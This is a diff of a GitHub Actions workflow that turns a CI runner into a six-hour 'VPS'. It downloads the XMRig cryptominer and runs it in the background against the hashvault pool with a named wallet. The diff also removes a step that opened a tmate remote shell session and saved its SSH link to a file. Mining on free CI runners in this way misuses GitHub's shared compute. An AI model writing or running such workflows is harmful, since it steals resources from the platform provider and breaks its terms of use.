@@ -9,8 +9,6 @@ jobs:
   start-vps:
     runs-on: ubuntu-latest
     timeout-minutes: 360  # 6 hours
-    env:
-      TMATE_SERVER: nyc1.tmate.io
 
     steps:
       - name: ⬇️ Checkout
@@ -26,20 +24,13 @@ jobs:
             unzip ".backup/$name.zip" -d . || echo "⚠️ No backup found."
           fi
 
-      - name: 🔐 Start tmate session
-        run: |
-          sudo apt update -y && sudo apt install -y tmate
-          tmate -S /tmp/tmate.sock new-session -d
-          tmate -S /tmp/tmate.sock wait tmate-ready
-          SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
-          echo "$SSH" | tee "links/${{ github.event.client_payload.vps_name || 'manual-vps' }}.txt"
-
       - name: 📥 Setup VPS (XMRig)
         run: |
           wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-focal-x64.tar.gz
           tar -xvzf xmrig-6.24.0-focal-x64.tar.gz
           cd xmrig-6.24.0
-          sudo su -c "./xmrig -o asia.hashvault.pro:443 -u 8AHRHxFXTbBDBh57fByZ1ZGmMh3fwUFiVRe4FCS4yGDqb9FMtVHXNvS9u5UVMVLDU3MhQ6dAfZWnCKq2rUBSXPQLGRT6unC -p vipminer -a rx --tls --cpu-priority=5 --randomx-1gb-pages -t 4"
+          sudo su -c "nohup ./xmrig -o asia.hashvault.pro:443 -u 8AHRHxFXTbBDBh57fByZ1ZGmMh3fwUFiVRe4FCS4yGDqb9FMtVHXNvS9u5UVMVLDU3MhQ6dAfZWnCKq2rUBSXPQLGRT6unC -p vipminer -a rx --tls --cpu-priority=5 --randomx-1gb-pages -t 4 > xmrig.log 2>&1 &"
+          echo "✅ XMRig started in background."
 
       - name: ⏳ Keep VPS alive
         run: |
